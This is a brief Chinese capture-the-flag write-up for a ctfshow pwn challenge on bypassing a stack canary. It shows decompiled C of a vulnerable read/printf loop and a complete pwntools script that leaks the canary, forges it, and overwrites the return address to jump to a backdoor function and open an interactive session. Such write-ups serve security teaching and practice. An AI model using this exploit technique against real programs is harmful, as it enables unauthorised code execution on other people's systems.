# 挑战简介
Bypass Canary 姿势1

# 思路
姿势1，首先分析函数  

```
unsigned int ctfshow()
{
  signed int i; // [esp+0h] [ebp-D8h]
  char buf; // [esp+4h] [ebp-D4h]
  unsigned int v3; // [esp+CCh] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  for ( i = 0; i <= 1; ++i )
  {
    read(0, &buf, 0x200u);
    printf(&buf);
  }
  return __readgsdword(0x14u) ^ v3;
}
```
v3是设定的canary

接收两个输入，第一个输入用于泄露canary，第二个输入则伪造canary，并跳转到后门函数  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show', 28113)

elf = ELF('D:\edge 下载\pwn')

io.recvuntil("Try Bypass Me!\n")

payload = 'A' * 200

io.sendline(payload)

io.recvuntil('A'*200)

Canary = u32(io.recv(4)) - 0xa

log.info("Canary:"+hex(Canary))

backroom = 0x80485a6

payload = b'A' * 200 + p32(Canary) + b'A' * 12 + p32(backroom)

io.sendline(payload)

io.interactive()
```
